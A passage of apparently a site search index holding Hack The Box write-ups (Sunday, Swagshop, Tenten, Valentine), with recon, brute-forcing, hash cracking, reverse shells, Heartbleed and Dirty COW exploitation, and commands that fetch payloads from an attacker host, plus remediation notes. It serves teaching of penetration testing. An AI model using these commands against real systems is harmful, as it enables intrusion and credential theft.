bases. Let\u2019s run an nmap scan that covers all ports. Since the full nmap scan takes too long to run, let\u2019s first run a quick scan to figure out which ports are open. nmap -p- -oA full-noscripts 10.10.10.76 --max-retries 0 \u2014 max-retries: number of port scan probe retransmissions We get back the following result showing that two other ports are open. Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-01-05 17:49 EST Warning: 10.10.10.76 giving up on port because retransmission cap hit (0). Nmap scan report for 10.10.10.76 Host is up (0.039s latency). Not shown: 63933 filtered ports, 1598 closed ports PORT STATE SERVICE 79/tcp open finger 111/tcp open rpcbind 22022/tcp open unknown 55029/tcp open unknown Then we run a more comprehensive scan to identify services running on the above ports. nmap -p 79,111,22022,55029 -sV -oA full-scripts 10.10.10.7 We get back the following result showing that: Port 22022: is running SunSSH 1.3 Port 55029: is running a service that nmap was not able to identify Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-01-05 17:52 EST Nmap scan report for 10.10.10.76 Host is up (0.037s latency). PORT STATE SERVICE VERSION 79/tcp open finger Sun Solaris fingerd |_finger: ERROR: Script execution failed (use -d to debug) 111/tcp open rpcbind 22022/tcp open ssh SunSSH 1.3 (protocol 2.0) | ssh-hostkey: | 1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA) |_ 1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA) 55029/tcp open unknown Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 31.37 seconds Since the UDP scan took too long to run, we don\u2019t have UDP scan results for this blog.","title":"Reconnaissance"},{"location":"Retired/Sunday Writeup wo Metasploit/#enumeration","text":"We\u2019ll start off with enumerating port 79. A quick google search on the \u201cFinger service\u201d tells us that the finger protocol is used to find out information about users on a remote system. Therefore, we can use it to enumerate usernames. First, check if there are any logged in users. root@kali:~# finger [@10](http://twitter.com/10).10.10.76 No one logged on No one is currently logged in. Let\u2019s check if the user \u201croot\u201d exists. root@kali:~# finger root@10.10.10.76 Login Name TTY Idle When Where root Super-User pts/3 Apr 24, 2018 sunday It does exist. Now, let\u2019s enumerate more usernames. The seclists project has a list of usernames that we can use in order to guess the usernames that are available on the server. /usr/share/seclists/Usernames/Names/names.txt Pentestmonkey has a finger-user-enum script that is used to enumerate OS-level user accounts via the finger service. Let\u2019s run that on our host. ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76 -U: file of usernames to check via finger service -t: server host running finger service We get the following result showing us that \u201csammy\u201d and \u201csunday\u201d are users of the system. .... sammy@10.10.10.76: sammy pts/2 Apr 24, 2018 10.10.14.4 .. sunny@10.10.10.76: sunny Jan 5 23:37 10.10.14.12 .. ....","title":"Enumeration"},{"location":"Retired/Sunday Writeup wo Metasploit/#initial-foothold","text":"Since SSH is open and we have two valid usernames, let\u2019s try brute-forcing the users\u2019 credentials using hydra. We\u2019ll start off with Sunny. hydra -l sunny -P /usr/share/wordlists/rockyou.txt 10.10.10.76 ssh -s 22022 -l: username -P: password file -s: port We get back the following result showing us that Sunny\u2019s password is \u201csunday\u201d. Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. .... [22022][ssh] host: 10.10.10.76 login: sunny password: sunday .... SSH into Sunny\u2019s account. ssh -p 22022 sunny@10.10.10.76 We get the following error. Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1 The error tells us that the client and server were unable to agree on the key exchange algorithm. The server offered three legacy algorithms for key exchange. So we\u2019ll have to choose one of these algorithms in order to login. ssh -oKexAlgorithms=diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76 -oKexAlgorithms: enable a key exchange algorithm that is disabled by default We\u2019re in! Locate the user.txt flag and try to view it. sunny@sunday:~$ find / -name user.txt 2 /dev/null /export/home/sammy/Desktop/user.txt sunny@sunday:~$ cat /export/home/sammy/Desktop/user.txt cat: /export/home/sammy/Desktop/user.txt: Permission denied We need to escalate our privileges to Sammy.","title":"Initial Foothold"},{"location":"Retired/Sunday Writeup wo Metasploit/#privilege-escalation","text":"Run the following command to view the list of allowed commands that the user can run with root privileges. sunny@sunday:~$ sudo -l User sunny may run the following commands on this host: (root) NOPASSWD: /root/troll We can run the /root/troll command as root. This is obviously a custom command so let\u2019s run it to see what it\u2019s doing (we don\u2019t have read access to it). sunny@sunday:~$ sudo /root/troll testing uid=0(root) gid=0(root) It seems to be a script that prints the id of the user running it. Since we ran it with the \u2018sudo\u2019 command, it prints the id of root. We don\u2019t have write access to the script, so we can\u2019t escalate our privileges using it. After a bit of digging, I found a backup file in the following directory. /backup It contains two files agen22.backup and shadow.backup. The former we don\u2019t have access to, however, we can view the latter. sammy@sunday:/backup$ cat shadow.backup mysql:NP::::::: openldap:*LK*::::::: webservd:*LK*::::::: postgres:NP::::::: svctag:*LK*:6445:::::: nobody:*LK*:6445:::::: noaccess:*LK*:6445:::::: nobody4:*LK*:6445:::::: sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445:::::: sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636:::::: It\u2019s a backup of the shadow file. We already know Sunny\u2019s password so we\u2019re not going to attempt to crack it. Instead, copy Sammy\u2019s password and save it in the file sammy-hash.txt. Then use John to crack the hash. root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt sammy-hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Press q or Ctrl-C to abort, almost any other key for status cooldude! (?) 1g 0:00:01:17 DONE (2020-01-05 21:03) 0.01292g/s 2648p/s 2648c/s 2648C/s domonique1..bluenote Use the --show option to display all of the cracked passwords reliably Session completed We got a password! Let\u2019s su into Sammy\u2019s account. su - sammy Now we can view the user.txt flag. Let\u2019s try to escalate to root privileges. Run the sudo command again to view the list of allowed commands the user can run as root. sammy@sunday:~$ sudo -l User sammy may run the following commands on this host: (root) NOPASSWD: /usr/bin/wget We can run wget with root privileges! If you\u2019re familiar with the \u201c-i\u201d flag in wget, you\u2019ll know that we can use it to output the content of files. Therefore, we can run the following command to get the root flag. sudo wget -i /root/root.txt However, in this scenario we\u2019re simply reading the content of the flag and not really escalating privileges. To get a root shell we need to chain the following two vulnerabilities: The user Sunny can execute the /root/troll file with root privileges, and The user Sammy can overwrite any root owned file using the wget command. Therefore, we\u2019ll use Sammy\u2019s sudo privileges to overwrite the /root/troll file and include a shell in it. Then we\u2019ll use Sunny\u2019s sudo privileges to run the /root/troll file and convert our shell to a root shell. Alright, let\u2019s do this! In the attack machine, create a file called \u201ctroll\u201d and add the following code to it. #!/usr/bin/bash bash Then start up a simple Python server in the directory the file is in. python -m SimpleHTTPServer 5555 Go back the target machine running with the Sammy user privileges, and run the wget command to overwrite the /root/troll file. sudo wget -O /root/troll [http://10.10.14.12:5555/troll](http://10.10.14.12:5555/troll) In another SSH session running with the Sunny user privileges, execute the troll file. sudo /root/troll Since we added a bash shell in the troll file and the troll file is being executed with root privilege, we get a root shell! Note: Something on the server seems to be resetting the /root/troll file every couple of seconds, therefore you only have small window of time between overwriting the troll file as Sammy and executing the troll file as Sunny.","title":"Privilege Escalation"},{"location":"Retired/Sunday Writeup wo Metasploit/#lessons-learned","text":"To gain an initial foothold on the box we exploited two vulnerabilities. Username enumeration of the finger service. The finger protocol is used to get information about users on a remote system. In our case, we used it to enumerate usernames that we later used to SSH into the server. The remediation for this vulnerability would be to disable this service. Weak authentication credentials. After getting a username from the finger service, we ran a brute force attack on SSH to obtain a user\u2019s credentials. The user should have used a sufficiently long password that is not easily crackable. To escalate privileges we exploited three vulnerabilities. Information disclosure. As a non privileged user, we had access to a backup of the shadow file that leaked hashed passwords. Any file that contains sensitive information should not be available to non privileged users. Weak authentication credentials. Although the passwords were hashed in the backup shadow file, we were able to obtain the plaintext passwords by running john on the hashes. Again, the users should have used sufficiently long passwords that are not easily crackable. Security Misconfigurations. Both Sammy and Sunny were configured to run commands as root. Chaining these two commands together allowed us to escalate our privileges to root. The administrators should have conformed to the concept of least privilege when configuring these users\u2019 accounts.","title":"Lessons Learned"},{"location":"Retired/Sunday Writeup wo Metasploit/#conclusion","text":"22 machines down, 25 more to go!","title":"Conclusion"},{"location":"Retired/Swagshop Writeup/","text":"Hello Guys , I am Faisal Husaini and this is my writeup on Medium for Swagshop machine which has retired. My username on HTB is ***\u201cfaisalelino\u201d . I was not able to publish other writeups as I was off since 6 months from Infosec and related stuffs due to my exams. Now finally after getting free , the first box I thought to do the simplest one as I almost forgot everything I had in my mind as my skills. So I tried to solve SwagShop as suggested from my friends. The IP for this box is 10.10.10.140, so let\u2019s get started NMAP Results nmap -sC -sV 10.10.10.140 We see that only 2 ports are open , Port 22 and Port 80 , which runs OpenSSH and Apache httpd services Port 80 \u2014 Web Service As we can see that it is running Magento , in background , we run gobuster Gobuster gobuster dir -u http://10.10.10.140 -w (wordlist) -t 50 We get few results , but before we check all these , lets check the magento version so that we can find any available exploit for the magento version. Magento Version If we check the /downloader directory on webpage , we get the Magento version of the below Exploiting Magento After searching alot for exploit on Magento version 1.9.0.0 or onwards , I got the exploit which worked for me , link for which will be at the end of this writeup. The exploit is actually creates a user on the database of Magento Now we try to login with the creds we just created through the exploit and login on \u2018 http://10.10.10.140/downloader \u201d As to go further and add or edit stuffs , we need to upload a Magento upload package We find another admin panel to the Magento ,i.e, \u201c http://10.10.10.140/index.php/admin \u201d and we can login to it as admin through the same credentials we got from the exploit We edit one of the php files and put our reverse shell and get a shell through Netcat by accessing the php file (here get.php) , i.e , \u201c http://10.10.10.140/get.php \u201d Getting Reverse Shell nc -nvlp (port) We successfully get our reverse shell , now we do the formalities of getting a better tty shell So we get a better shell now , time to get the user flag first User Flag The user flag was located at \u201c /home/haris/ \u201d folder as user.txt file Privelege Escalation For privelege escalation , we run the \u201c sudo -l \u201d command to see the sudoers As we can see that we can run /usr/bin/vi as root without password on */var/www/html/** Lets use the vi privelege escalation technique As soon as we press Enter , we get a root shell We successfully got the root shell , the root flag on HTB boxes are usually located at /root folder So here ends the writeup part of the box , below I will mention the vulnerabilities used to pwn this box and also the resources. Vulnerabilities Used To Pwn Remote Code Execution and SQLi to create the admin creds Uploading PHP shell after admin access vi post exploit technique to get root as vi was allowed as sudo without password Important Links Which were Used To Solve This Box joren485/Magento-Shoplift-SQLI Proof of Concept code of the Shoplift code This is code exploits a few pretty big flaw in the very popular webshop CMS Magento. I did not find the exploit, all credits go to Checkpoint. pentestmonkey/php-reverse-shell Contribute to pentestmonkey/php-reverse-shell development by creating an account on GitHub. Ethical Hacking: sudo vi exploit Computer Security Student LLC provides Cyber Security Hac-King-Do Training, Lessons, and Tutorials in Penetration Testing, Vulnerability Assessment, Ethical Exploitation, Malware Analysis, and Forensic Investigation. Magento Web Exploit Case Studies","title":"38. Swagshop Writeup.md"},{"location":"Retired/Swagshop Writeup/#nmap-results","text":"nmap -sC -sV 10.10.10.140 We see that only 2 ports are open , Port 22 and Port 80 , which runs OpenSSH and Apache httpd services","title":"NMAP Results"},{"location":"Retired/Swagshop Writeup/#port-80-web-service","text":"As we can see that it is running Magento , in background , we run gobuster","title":"Port 80 \u2014 Web Service"},{"location":"Retired/Swagshop Writeup/#gobuster","text":"gobuster dir -u http://10.10.10.140 -w (wordlist) -t 50 We get few results , but before we check all these , lets check the magento version so that we can find any available exploit for the magento version.","title":"Gobuster"},{"location":"Retired/Swagshop Writeup/#magento-version","text":"If we check the /downloader directory on webpage , we get the Magento version of the below","title":"Magento Version"},{"location":"Retired/Swagshop Writeup/#exploiting-magento","text":"After searching alot for exploit on Magento version 1.9.0.0 or onwards , I got the exploit which worked for me , link for which will be at the end of this writeup. The exploit is actually creates a user on the database of Magento Now we try to login with the creds we just created through the exploit and login on \u2018 http://10.10.10.140/downloader \u201d As to go further and add or edit stuffs , we need to upload a Magento upload package We find another admin panel to the Magento ,i.e, \u201c http://10.10.10.140/index.php/admin \u201d and we can login to it as admin through the same credentials we got from the exploit We edit one of the php files and put our reverse shell and get a shell through Netcat by accessing the php file (here get.php) , i.e , \u201c http://10.10.10.140/get.php \u201d","title":"Exploiting Magento"},{"location":"Retired/Swagshop Writeup/#getting-reverse-shell","text":"nc -nvlp (port) We successfully get our reverse shell , now we do the formalities of getting a better tty shell So we get a better shell now , time to get the user flag first","title":"Getting Reverse Shell"},{"location":"Retired/Swagshop Writeup/#user-flag","text":"The user flag was located at \u201c /home/haris/ \u201d folder as user.txt file","title":"User Flag"},{"location":"Retired/Swagshop Writeup/#privelege-escalation","text":"For privelege escalation , we run the \u201c sudo -l \u201d command to see the sudoers As we can see that we can run /usr/bin/vi as root without password on */var/www/html/** Lets use the vi privelege escalation technique As soon as we press Enter , we get a root shell We successfully got the root shell , the root flag on HTB boxes are usually located at /root folder So here ends the writeup part of the box , below I will mention the vulnerabilities used to pwn this box and also the resources.","title":"Privelege Escalation"},{"location":"Retired/Swagshop Writeup/#vulnerabilities-used-to-pwn","text":"Remote Code Execution and SQLi to create the admin creds Uploading PHP shell after admin access vi post exploit technique to get root as vi was allowed as sudo without password","title":"Vulnerabilities Used To Pwn"},{"location":"Retired/Swagshop Writeup/#important-links-which-were-used-to-solve-this-box","text":"joren485/Magento-Shoplift-SQLI Proof of Concept code of the Shoplift code This is code exploits a few pretty big flaw in the very popular webshop CMS Magento. I did not find the exploit, all credits go to Checkpoint. pentestmonkey/php-reverse-shell Contribute to pentestmonkey/php-reverse-shell development by creating an account on GitHub. Ethical Hacking: sudo vi exploit Computer Security Student LLC provides Cyber Security Hac-King-Do Training, Lessons, and Tutorials in Penetration Testing, Vulnerability Assessment, Ethical Exploitation, Malware Analysis, and Forensic Investigation. Magento Web Exploit Case Studies","title":"Important Links Which were Used To Solve This Box"},{"location":"Retired/Tenten Writeup/","text":"Tools Used: * NMAP WPScan Steghide John* Difficulty: 5/10 Network Enumeration Let\u2019s start with a simple NMAP scan. We can see from the NMAP scan we can see that ports 22 (SSH) and 80 (HTTP) are open. After running a more intense scan on port 80, a few things stick out. We can see Apache 2.4.18 and WordPress 4.7.3. After searching on Exploit-DB, there are no exploits for either of these applications. After browsing to port 80, we can see the WordPress site running. The first thing to do on a WordPress site is to run wpscan for any vulnerabilities. WPScan results returned a vulnerability finding regarding the job manager. The second reference links of the exploit findings give us a website with a PHP script for exploitation. In the script, it\u2019s calling for two inputs website and file name. We already have the site we now need to find the file name. If we go to the apply link on the jobs page title says Pen Tester. If we change the number, we get a different job application. Let\u2019s see what all of the titles say. We can do this with a simple bash script. for i in $(seq 1 20); do echo -n \u201c$i: \u201c; curl -s http://10.10.10.10/index.php/jobs/apply/\\$i/ | grep \u2018 \u2019; done The results look typical except for line 13 that says \u201cHackerAccessGranted.\u201d We need to make a few changes to our script. for year in range(2017,2018): for i in range(1,13): for extension in { php , html , pdf , png , gif , jpg , jpeg }: After running the script, we get a file name returned. HackerAccessGranted.jpg Looking at the photo, I don\u2019t see anything unusual and being a CTF machine the first thing that comes to my mind is steganography. Using steghide to extract the hidden content we see there is an RSA Private key. Most likely this will be used to ssh into the server, however, we need to figure out the password for the key. To brute force the key\u2019s password we need sshng2john python script to get the hash in john format. Running the hash through john, we find out the password is \u201csuperpassword\u201d I tried using the key to SSH into the server, and it was not working. Looking back at the WPScan I remember seeing a username discovered. Using the user \u201ctakis,\u201d the RSA key, and the passphrase we now have user-level SSH into tenten. We can read user.txt. Privilege escalation Now that we user access we need to elevate our permissions to root. Let\u2019s start with getting system information. takis@tenten:~\\$ cat /etc/issue Ubuntu 16.04.2 LTS \\n \\l Escalating to root shows that we have access to a file called \u201c/bin/fuckin.\u201d We need to find out what in this file. fuckin seems to be a batch script that contains arguments that we can pass on. Adding an argument after the file while running it as sudo allows us to run commands as root. Adding bash to the first argument gives us root shell. As root, we can view root.txt","title":"30. Tenten Writeup.md"},{"location":"Retired/Valentine Writeup wo Metasploit/","text":"Reconnaissance First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA htb/valentine/nmap/initial 10.10.10.79 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file nmap/initial We get back the following result showing that three ports are open: Port 22 : running OpenSSH 5.9p1 Ports 80 443: running Apache httpd 2.2.22 Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -O -p- -oA htb/valentine/nmap/full 10.10.10.79 We get back the following result. No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -O -p- -oA htb/valentine/nmap/udp 10.10.10.79 I managed to root the box and write this blog, while this UDP scan still did not terminate. So for this blog, I don\u2019t have the UDP scan results. Enumeration Visit the site in the browser. It only contains a picture (which is a big indication of the vulnerability we\u2019ll find) and no other links. So we\u2019ll have to run Gobuster. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.79 We get back the following results. /index, /omg and /server-status lead nowhere. /encode and /decode seem to be scripts that encode and decode strings. /dev on the other hand proves to be interesting. Click on the hype_key to get the following page. It contains a string that is hex encoded. Let\u2019s use an online tool to convert it to text. We find out that it is an RSA private key! Take the converted text format and save it into a hype_key file. Disclaimer: You should NEVER enter your or anyone else\u2019s credentials in online tools just in case it gets logged at the backend! In this case, it doesn\u2019t matter since this is a fake security assessment. We\u2019ll try and ssh using our newly found private key. Based on the naming convention of pub/priv keys, \u201chype\u201d is likely the username. ssh -i hype_key hype@10.10.10.79 -i: Selects a file from which the identity (private key) for RSA authentication is read. I get back the following error. Since a private key is equivalent to a password, it should only be readable by you. We resolve the error using the following command. chmod 400 hype_key However, we are prompted for a password that we still don\u2019t have and so we need to do more enumeration. Run nmap\u2019s vulnerability scan script to determine if any of the services are vulnerable. nmap --script vuln -oA vuln-scan 10.10.10.79 Port 443 is running a version of OpenSSL that is vulnerable to Heartbleed! If you don\u2019t know what that is, here\u2019s a great comic explaining it. It is essentially a vulnerability in the popular OpenSSL cryptographic software library. This vulnerability allows anyone on the Internet to read the memory of the systems protected by this vulnerable version of OpenSSL. This can lead to the compromise of secret keys, passwords, information, etc. It also allows attackers to eavesdrop on communications. There\u2019s a whole site dedicated to the Hearbleed bug . Gaining an Initial Foothold Now that we know for sure that port 443 is running a vulnerable version of OpenSSL, let\u2019s try and exploit it to gain an initial foothold on the target machine. First, get the exploit from online and clone it. git clone [https://gist.github.com/10174134.git](https://gist.github.com/10174134.git) Run the script to view the help instructions. Let\u2019s run the exploit with a loop number of 10. We might have to run the script multiple times or increase the loop size depending on how useful the content of the memory dump is. python heartbleed.py -p 443 -n 10 10.10.10.79 We\u2019re looking for hype\u2019s passphrase so that we could SSH into his account. After rummaging through the memory dump, we find the following strings. Someone used the decode.php script on the website to decode a string of characters. Copy the string and use the site to decode it. This looks like a password! Let\u2019s use it to ssh into hype\u2019s account. ssh -i hype_key hype@10.10.10.79 We have a low privileged shell! Grab the user flag. We need to escalate privileges. Privilege Escalation Grab the LinEnum script if you don\u2019t already have it. In the attack machine, start up a server in the directory that the script resides in. python -m SimpleHTTPServer 5555 In the target machine download the script. wget [http://10.10.14.6:5555/LinEnum.sh](http://10.10.14.6:5555/LinEnum.sh) Run the script. ./LinEnum.sh We get back many results of which two are interesting. First, it\u2019s running an old version of Ubuntu that is probably vulnerable to Dirty COW . Dirty COW is a privilege escalation vulnerability which exploits a race condition in the way the Linux kernel\u2019s memory subsystem handles the copy-on-write (COW) breakage of private read-only memory mappings. Second, there\u2019s an active tmux session that is owned by root. According to the tmux man page : tmux is a terminal multiplexer: it enables a number of terminals to be created, accessed, and controlled from a single screen. It\u2019s essentially a shell that is owned by root! So if we can enter this active tmux session, any command we run there is executed with root privileges. This one I didn\u2019t figure out on my own, I had to use ippsec\u2019s help . Alright, so we have two ways of escalating privileges. Privilege Escalation #1: Dirty COW Vulnerability To confirm that the target machine is vulnerable to Dirty COW, download the Linux Exploit Suggester script. In the attack machine, start up a server in the directory where the script resides. python -m SimpleHTTPServer 5555 Download the exploit on your target machine. wget [http://10.10.14.6:5555/linux-exploit-suggester-2.pl](http://10.10.14.6:5555/linux-exploit-suggester-2.pl) Run the script. ./linux-exploit-suggester-2.pl We confirm that it is vulnerable to Dirty COW. I tried several of the exploits on this page but they didn\u2019t work. Therefore, I ended up using this exploit . Clone the exploit on the attack machine. git clone [https://gist.github.com/e9d4ff65d703a9084e85fa9df083c679.git](https://gist.github.com/e9d4ff65d703a9084e85fa9df083c679.git) Start up a server in the directory where the exploit resides. python -m SimpleHTTPServer 5555 Transfer the exploit to the target machine. wget [http://10.10.14.6:5555/dirty.c](http://10.10.14.6:5555/dirty.c) Compile the file as per the included compile instructions. gcc -pthread dirty.c -o dirty -lcrypt Run the exploit. ./dirty Choose the password for the newly created user. Change to the newly created user. su firefart We have root privileges! Grab the root flag. Privilege Escalation #2: Attach to Root Owned tmux Session In the target machine, attach to the tmux shell using the following command. tmux -S /.devs/dev_sess Since this is a session owned by root, we have root privileges! Lessons Learned To gain an initial foothold on the target machine we required two pieces of information: (1) the private key and (2) the passphrase to ssh into a user\u2019s account. We got the private key by enumerating the directories and files that are available on the web server. As for the passphrase we exploited the Heartbleed bug in the vulnerable OpenSSL version used on the target machine. Getting the private key could have been avoided if the user did not publish his credentials on a public web server. As for the passphrase, this could have been avoided if the patched version of OpenSSL was installed. To escalate to root privileges we had two options: (1) exploit the Dirty COW vulnerability, or (2) attach to a tmux session that was owned by root. Exploiting Dirty COW could have been avoided if the target machine was patched. As for the tmux privilege escalation, I\u2019m not entirely sure that it is a vulnerability (and I stand to be corrected). It seems to be an intended functionality of tmux that allows any user on the box to attach to any session opened on that box. Precautions can be taken by (1) not running your tmux session as root and using sudo within the tmux session if you need root privileges, and (2) closing the tmux session once you\u2019re done instead of having it run (and accessible) the entire time. Conclusion 8 machines down, 33 more to go","title":"15. Valentine Writeup w/o Metasploit.md"},{"location":"Retired/Valentine Writeup wo Metasploit/#reconnaissance","text":"First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA htb/valentine/nmap/initial 10.10.10.79 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file nmap/initial We get back the following result showing that three ports are open: Port 22 : running OpenSSH 5.9p1 Ports 80 443: running Apache httpd 2.2.22 Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -O -p- -oA htb/valentine/nmap/full 10.10.10.79 We get back the following result. No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -O -p- -oA htb/valentine/nmap/udp 10.10.10.79 I managed to root the box and write this blog, while this UDP scan still did not terminate. So for this blog, I don\u2019t have the UDP scan results.","title":"Reconnaissance"},{"location":"Retired/Valentine Writeup wo Metasploit/#enumeration","text":"Visit the site in the browser. It only contains a picture (which is a big indication of the vulnerability we\u2019ll find) and no other links. So we\u2019ll have to run Gobuster. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.79 We get back the following results. /index, /omg and /server-status lead nowhere. /encode and /decode seem to be scripts that encode and decode strings. /dev on the other hand proves to be interesting. Click on the hype_key to get the following page. It contains a string that is hex encoded. Let\u2019s use an online tool to convert it to text. We find out that it is an RSA private key! Take the converted text format and save it into a hype_key file. Disclaimer: You should NEVER enter your or anyone else\u2019s credentials in online tools just in case it gets logged at the backend! In this case, it doesn\u2019t matter since this is a fake security assessment. We\u2019ll try and ssh using our newly found private key. Based on the naming convention of pub/priv keys, \u201chype\u201d is likely the username. ssh -i hype_key hype@10.10.10.79 -i: Selects a file from which the identity (private key) for RSA authentication is read. I get back the following error. Since a private key is equivalent to a password, it should only be readable by you. We resolve the error using the following command. chmod 400 hype_key However, we are prompted for a password that we still don\u2019t have and so we need to do more enumeration. Run nmap\u2019s vulnerability scan script to determine if any of the services are vulnerable. nmap --script vuln -oA vuln-scan 10.10.10.79 Port 443 is running a version of OpenSSL that is vulnerable to Heartbleed! If you don\u2019t know what that is, here\u2019s a great comic explaining it. It is essentially a vulnerability in the popular OpenSSL cryptographic software library. This vulnerability allows anyone on the Internet to read the memory of the systems protected by this vulnerable version of OpenSSL. This can lead to the compromise of secret keys, passwords, information, etc. It also allows attackers to eavesdrop on communications. There\u2019s a whole site dedicated to the Hearbleed bug .","title":"Enumeration"},{"location":"Retired/Valentine Writeup wo Metasploit/#gaining-an-initial-foothold","text":"Now that we know for sure that port 443 is running a vulnerable version of OpenSSL, let\u2019s try and exploit it to gain an initial foothold on the target machine. First, get the exploit from online and clone it. git clone [https://gist.github.com/10174134.git](https://gist.github.com/10174134.git) Run the script to view the help instructions. Let\u2019s run the exploit with a loop number of 10. We might have to run the script multiple times or increase the loop size depending on how useful the content of the memory dump is. python heartbleed.py -p 443 -n 10 10.10.10.79 We\u2019re looking for hype\u2019s passphrase so that we could SSH into his account. After rummaging through the memory dump, we find the following strings. Someone used the decode.php script on the website to decode a string of characters. Copy the string and use the site to decode it. This looks like a password! Let\u2019s use it to ssh into hype\u2019s account. ssh -i hype_key hype@10.10.10.79 We have a low privileged shell! Grab the user flag. We need to escalate privileges.","title":"Gaining an Initial Foothold"},{"location":"Retired/Valentine Writeup wo Metasploit/#privilege-escalation","text":"Grab the LinEnum script if you don\u2019t already have it. In the attack machine, start up a server in the directory that the script resides in. python -m SimpleHTTPServer 5555 In the target machine download the script. wget [http://10.10.14.6:5555/LinEnum.sh](http://10.10.14.6:5555/LinEnum.sh) Run the script. ./LinEnum.sh We get back many results of which two are interesting. First, it\u2019s running an old version of Ubuntu that is probably vulnerable to Dirty COW . Dirty COW is a privilege escalation vulnerability which exploits a race condition in the way the Linux kernel\u2019s memory subsystem handles the copy-on-write (COW) breakage of private read-only memory mappings. Second, there\u2019s an active tmux session that is owned by root. According to the tmux man page : tmux is a terminal multiplexer: it enables a number of terminals to be created, accessed, and controlled from a single screen. It\u2019s essentially a shell that is owned by root! So if we can enter this active tmux session, any command we run there is executed with root privileges. This one I didn\u2019t figure out on my own, I had to use ippsec\u2019s help . Alright, so we have two ways of escalating privileges. Privilege Escalation #1: Dirty COW Vulnerability To confirm that the target machine is vulnerable to Dirty COW, download the Linux Exploit Suggester script. In the attack machine, start up a server in the directory where the script resides. python -m SimpleHTTPServer 5555 Download the exploit on your target machine. wget [http://10.10.14.6:5555/linux-exploit-suggester-2.pl](http://10.10.14.6:5555/linux-exploit-suggester-2.pl) Run the script. ./linux-exploit-suggester-2.pl We confirm that it is vulnerable to Dirty COW. I tried several of the exploits on this page but they didn\u2019t work. Therefore, I ended up using this exploit . Clone the exploit on the attack machine. git clone [https://gist.github.com/e9d4ff65d703a9084e85fa9df083c679.git](https://gist.github.com/e9d4ff65d703a9084e85fa9df083c679.git) Start up a server in the directory where the exploit resides. python -m SimpleHTTPServer 5555 Transfer the exploit to the target machine. wget [http://10.10.14.6:5555/dirty.c](http://10.10.14.6:5555/dirty.c) Compile the file as per the included compile instructions. gcc -pthread dirty.c -o dirty -lcrypt Run the exploit. ./dirty Choose the password for the newly created user. Change to the newly created user. su firefart We have root privileges! Grab the root flag. Privilege Escalation #2: Attach to Root Owned tmux Session In the target machine, attach to the tmux shell using the following command. tmux -S /.devs/dev_sess Since this is a session owned by root, we have root privileges!","title":"Privilege Escalation"},{"location":"Retired/Valentine Writeup wo Metasploit/#lessons-learned","text":"To gain an initial foothold on the target machine we required two pieces of information: (1) the private key and (2) the passphrase to ssh into a user\u2019s account. We got the private key by enumerating the directories and files that are available on the web server. As for the passphrase we exploited the Heartbleed bug in the vulnerable OpenSSL version used on the target machine. Getting the private key could have been avoided if the user did not publish his credentials on a public web server. As for the passphrase, this could have been avoided if the patched version of OpenSSL was installed. To escalate to root privileges we had two options: (1) exploit the Dirty COW vulnerability, or (2) attach to a tmux session that was owned by root. Exploiting Dirty COW could have been avoided if the target machine was patched. As for the tmux privilege escalation, I\u2019m not entirely sure that it is a vulnerability (and I stand to be corrected). It seems to be an intended functionality of tmux that allows any user on the box to attach to any session opened on that box. Precautions can be taken by (1) not running your tmux session as root and using sudo within the tmux session if you need root privileges, and (2) closing the tmux session once you\u2019re done instead of having it run (and accessible) the entire time.","title":"Lessons Learned"},{"location":"Retired/Valentine Writeup wo Metasploit/#conclusion","text":"8 machines down, 33 more to go","title":"Conclusion"}]}